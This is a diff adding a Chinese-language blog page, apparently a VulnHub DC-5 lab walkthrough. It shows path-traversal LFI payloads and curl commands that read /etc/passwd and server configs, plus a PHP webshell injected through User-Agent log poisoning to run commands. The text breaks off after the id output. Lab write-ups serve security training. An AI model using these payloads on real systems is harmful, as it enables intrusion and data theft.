@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="靶机简介DC-5 是 VulnHub 上 DC 系列靶机中的第五台，由 DCAU 设计。该靶机模拟了一台运行 Nginx + PHP 的 Linux Web 服务器，核心漏洞链为 文件包含（LFI）→ Nginx 日志投毒 → RCE，最终通过 screen-4.5.0 SUID 提权（CVE-2017-5618）获取 root 权限。    属性 值    靶机名称 DC-5   难度 中等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub DC-5靶机实战">
+<meta property="og:url" content="https://congliang.github.io/VulnHub-DC5-writeup/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="靶机简介DC-5 是 VulnHub 上 DC 系列靶机中的第五台，由 DCAU 设计。该靶机模拟了一台运行 Nginx + PHP 的 Linux Web 服务器，核心漏洞链为 文件包含（LFI）→ Nginx 日志投毒 → RCE，最终通过 screen-4.5.0 SUID 提权（CVE-2017-5618）获取 root 权限。    属性 值    靶机名称 DC-5   难度 中等">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-08-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.999Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/VulnHub-DC5-writeup/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/VulnHub-DC5-writeup/","path":"VulnHub-DC5-writeup/","title":"VulnHub DC-5靶机实战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnHub DC-5靶机实战 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">靶机简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">渗透流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">3.</span> <span class="nav-text">一、环境准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AF%BC%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">1.1 下载与导入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%94%BB%E5%87%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">3.2.</span> <span class="nav-text">1.2 攻击机信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">二、信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">4.1.</span> <span class="nav-text">2.1 主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">4.2.</span> <span class="nav-text">2.2 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">4.3.</span> <span class="nav-text">2.3 目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="nav-number">4.4.</span> <span class="nav-text">2.4 网站功能分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%EF%BC%9AContact-%E8%A1%A8%E5%8D%95-LFI"><span class="nav-number">5.</span> <span class="nav-text">三、漏洞发现：Contact 表单 LFI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="nav-number">5.1.</span> <span class="nav-text">3.1 初步测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E8%BF%9B%E4%B8%80%E6%AD%A5%E9%AA%8C%E8%AF%81"><span class="nav-number">5.2.</span> <span class="nav-text">3.2 进一步验证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81LFI-%E5%88%B0-RCE%EF%BC%9ANginx-%E6%97%A5%E5%BF%97%E6%8A%95%E6%AF%92"><span class="nav-number">6.</span> <span class="nav-text">四、LFI 到 RCE：Nginx 日志投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E7%A1%AE%E8%AE%A4-Nginx-%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="nav-number">6.1.</span> <span class="nav-text">4.1 确认 Nginx 日志路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">6.2.</span> <span class="nav-text">4.2 原理分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-Burp-Suite-%E6%8A%95%E6%AF%92"><span class="nav-number">6.3.</span> <span class="nav-text">4.3 Burp Suite 投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E8%A7%A6%E5%8F%91%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">6.4.</span> <span class="nav-text">4.4 触发代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">6.5.</span> <span class="nav-text">4.5 获取反弹 Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%8F%90%E6%9D%83%EF%BC%9Ascreen-4-5-0-SUID%EF%BC%88CVE-2017-5618%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">五、提权：screen-4.5.0 SUID（CVE-2017-5618）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">7.1.</span> <span class="nav-text">5.1 基础信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A4"><span class="nav-number">7.2.</span> <span class="nav-text">5.2 漏洞确认</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E6%9F%A5%E7%9C%8B-Exploit-%E5%86%85%E5%AE%B9"><span class="nav-number">7.3.</span> <span class="nav-text">5.3 查看 Exploit 内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E6%89%A7%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="nav-number">7.4.</span> <span class="nav-text">5.4 执行提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-%E8%8E%B7%E5%8F%96-Flag"><span class="nav-number">7.5.</span> <span class="nav-text">5.5 获取 Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">六、攻击链总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">七、防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">10.</span> <span class="nav-text">八、参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">11.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC5-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulnHub DC-5靶机实战 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub DC-5靶机实战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-08-15T08:00:00+08:00">2024-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>DC-5 是 VulnHub 上 DC 系列靶机中的第五台，由 DCAU 设计。该靶机模拟了一台运行 Nginx + PHP 的 Linux Web 服务器，核心漏洞链为 <strong>文件包含（LFI）→ Nginx 日志投毒 → RCE</strong>，最终通过 <strong>screen-4.5.0 SUID 提权</strong>（CVE-2017-5618）获取 root 权限。</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶机名称</td>
+<td>DC-5</td>
+</tr>
+<tr>
+<td>难度</td>
+<td>中等</td>
+</tr>
+<tr>
+<td>目标</td>
+<td>读取 &#x2F;root&#x2F;flag.txt</td>
+</tr>
+<tr>
+<td>攻击机</td>
+<td>Kali Linux</td>
+</tr>
+<tr>
+<td>网络模式</td>
+<td>NAT（仅主机模式也可）</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="渗透流程图"><a href="#渗透流程图" class="headerlink" title="渗透流程图"></a>渗透流程图</h2><pre class="mermaid">graph TD
+    A[开始] --> B[主机发现: arp-scan / netdiscover]
+    B --> C[端口扫描: nmap]
+    C --> D{识别服务}
+    D --> E[HTTP 80: Nginx]
+    D --> F[RPC 111: rpcbind]
+    D --> G[SSH 22 过滤]
+    E --> H[目录扫描: dirb/gobuster]
+    H --> I[浏览网站, 发现 Contact 表单]
+    I --> J[测试 Contact 表单, 发现 LFI]
+    J --> K[确认 LFI: /etc/passwd 等]
+    K --> L[思路: LFI 如何转 RCE?]
+    L --> M[Nginx 日志投毒]
+    M --> N[Burp 抓包, User-Agent 注入 PHP 代码]
+    N --> O[访问 /var/log/nginx/access.log 触发代码执行]
+    O --> P[获得反弹 shell]
+    P --> Q[基础信息收集: uname, SUID, cron 等]
+    Q --> R[发现 screen-4.5.0 SUID]
+    R --> S[搜索漏洞: searchsploit screen]
+    S --> T[CVE-2017-5618 本地提权]
+    T --> U[编译/执行 exploit]
+    U --> V[获得 root shell]
+    V --> W[读取 /root/flag.txt]
+    W --> X[结束]</pre>
+
+<hr>
+<h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="1-1-下载与导入"><a href="#1-1-下载与导入" class="headerlink" title="1.1 下载与导入"></a>1.1 下载与导入</h3><p>从 VulnHub 官网下载 DC-5 的 OVA 镜像文件，使用 VMware Workstation 或 VirtualBox 导入。网络适配器设置为 <strong>NAT 模式</strong>或<strong>仅主机模式</strong>，确保攻击机和靶机在同一网段。</p>
+<h3 id="1-2-攻击机信息"><a href="#1-2-攻击机信息" class="headerlink" title="1.2 攻击机信息"></a>1.2 攻击机信息</h3><p>本实战使用 Kali Linux 作为攻击机，IP 地址为 <code>192.168.10.128</code>（以实际环境为准）。</p>
+<hr>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>首先通过 <code>arp-scan</code> 或 <code>netdiscover</code> 工具扫描局域网内存活主机，定位靶机 IP。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>很快就能发现新增的 IP 地址，假设靶机 IP 为 <code>192.168.10.133</code>。</p>
+<p>也可以使用 <code>nmap</code> 进行存活主机扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.10.0/24</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><p>对靶机进行全端口扫描，识别开放的服务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -p- -T4 192.168.10.133</span><br></pre></td></tr></table></figure>
+
+<p><strong>扫描结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>80&#x2F;tcp</td>
+<td>HTTP</td>
+<td>nginx 1.6.2</td>
+</tr>
+<tr>
+<td>111&#x2F;tcp</td>
+<td>rpcbind</td>
+<td>2-4</td>
+</tr>
+<tr>
+<td>22&#x2F;tcp</td>
+<td>SSH</td>
+<td>filtered</td>
+</tr>
+<tr>
+<td>42376&#x2F;tcp</td>
+<td>status</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<p>关键发现：</p>
+<ul>
+<li><strong>80 端口</strong>开放 Nginx 1.6.2 Web 服务</li>
+<li>SSH 端口被<strong>过滤</strong>（filtered），无法直接爆破</li>
+<li>rpcbind 服务开放但暂无可利用通道</li>
+</ul>
+<h3 id="2-3-目录扫描"><a href="#2-3-目录扫描" class="headerlink" title="2.3 目录扫描"></a>2.3 目录扫描</h3><p>使用 <code>dirb</code> 或 <code>gobuster</code> 对 Web 服务进行目录枚举。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.10.133</span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.10.133 -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>发现的目录和文件包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/index.html</span><br><span class="line">/contact.php</span><br><span class="line">/thankyou.php</span><br><span class="line">/footer.php</span><br><span class="line">/css/</span><br><span class="line">/images/</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-网站功能分析"><a href="#2-4-网站功能分析" class="headerlink" title="2.4 网站功能分析"></a>2.4 网站功能分析</h3><p>浏览器访问 <code>http://192.168.10.133</code>，网站是一个简洁的博客或公司首页。导航栏包含以下页面：</p>
+<ul>
+<li><strong>Home</strong> - 首页</li>
+<li><strong>About Us</strong> - 关于我们页</li>
+<li><strong>Contact</strong> - 联系表单页（<code>contact.php</code>）</li>
+<li><strong>Thank You</strong> - 感谢页（<code>thankyou.php</code>）</li>
+</ul>
+<p>重点关注 <code>/contact.php</code> 页面，它包含一个联系表单，允许用户提交姓名、邮箱、留言等信息。我们猜测该页面可能存在参数传递与文件包含漏洞。</p>
+<hr>
+<h2 id="三、漏洞发现：Contact-表单-LFI"><a href="#三、漏洞发现：Contact-表单-LFI" class="headerlink" title="三、漏洞发现：Contact 表单 LFI"></a>三、漏洞发现：Contact 表单 LFI</h2><h3 id="3-1-初步测试"><a href="#3-1-初步测试" class="headerlink" title="3.1 初步测试"></a>3.1 初步测试</h3><p>访问 <code>contact.php</code> 页面后，首先尝试修改 URL 参数。在浏览器地址栏中尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=test</span><br></pre></td></tr></table></figure>
+
+<p>页面内容发生变化——这意味着参数 <code>file</code> 被后端 PHP 脚本处理了。</p>
+<p>尝试经典的本地文件包含 Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功读取到 <code>/etc/passwd</code> 文件内容！</strong> 这确认了<strong>本地文件包含（LFI）漏洞</strong>的存在。</p>
+<h3 id="3-2-进一步验证"><a href="#3-2-进一步验证" class="headerlink" title="3.2 进一步验证"></a>3.2 进一步验证</h3><p>继续尝试读取更多系统文件以确认 LFI 的范围和权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取 passwd 文件</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../etc/passwd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 nginx 配置文件</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../etc/nginx/nginx.conf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 PHP 配置</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../etc/php5/fpm/php.ini&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这些文件都能成功读取，说明 LFI 漏洞有效且权限足够。通过读取 <code>/etc/passwd</code> 我们发现系统中存在普通用户账户，但密码哈希存储在 <code>/etc/shadow</code> 中，通常情况下 Web 用户无法直接读取。</p>
+<hr>
+<h2 id="四、LFI-到-RCE：Nginx-日志投毒"><a href="#四、LFI-到-RCE：Nginx-日志投毒" class="headerlink" title="四、LFI 到 RCE：Nginx 日志投毒"></a>四、LFI 到 RCE：Nginx 日志投毒</h2><p>仅仅拥有 LFI 是不够的，我们需要将其升级为远程代码执行（RCE）。一个经典思路是<strong>日志文件投毒（Log Poisoning）</strong>。</p>
+<h3 id="4-1-确认-Nginx-日志路径"><a href="#4-1-确认-Nginx-日志路径" class="headerlink" title="4.1 确认 Nginx 日志路径"></a>4.1 确认 Nginx 日志路径</h3><p>通过 LFI 尝试读取 Nginx 访问日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>成功读取到日志文件，并且可以看到之前的浏览器请求记录，包括 User-Agent、请求路径等信息。</p>
+<h3 id="4-2-原理分析"><a href="#4-2-原理分析" class="headerlink" title="4.2 原理分析"></a>4.2 原理分析</h3><p>Nginx 的访问日志会记录每一次 HTTP 请求的详细信息，其中包括 <code>User-Agent</code> 头部。如果我们能将 PHP 代码注入到 <code>User-Agent</code> 中，随后通过 LFI 去 <code>include</code> 该日志文件，PHP 引擎就会解析并执行嵌入在日志中的 PHP 代码。</p>
+<p>这就是<strong>日志投毒（Log Poisoning）攻击</strong>的核心思路。</p>
+<h3 id="4-3-Burp-Suite-投毒"><a href="#4-3-Burp-Suite-投毒" class="headerlink" title="4.3 Burp Suite 投毒"></a>4.3 Burp Suite 投毒</h3><p>使用 Burp Suite 拦截一次对网站的请求，将 <code>User-Agent</code> 替换为 PHP 一句话木马：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.10.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>发送该请求后，PHP 代码会被原样写入 Nginx 的 <code>access.log</code> 中。</p>
+<h3 id="4-4-触发代码执行"><a href="#4-4-触发代码执行" class="headerlink" title="4.4 触发代码执行"></a>4.4 触发代码执行</h3><p>再次通过 LFI 访问日志文件，并通过 <code>cmd</code> 参数传递系统命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<p>页面返回了类似以下内容，其中夹杂着 <code>id</code> 命令的执行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p><strong>至此，LFI 成功转化为 RCE！</strong> 我们以 <code>www-data</code> 用户的身份在靶机上执行任意系统命令。</p>
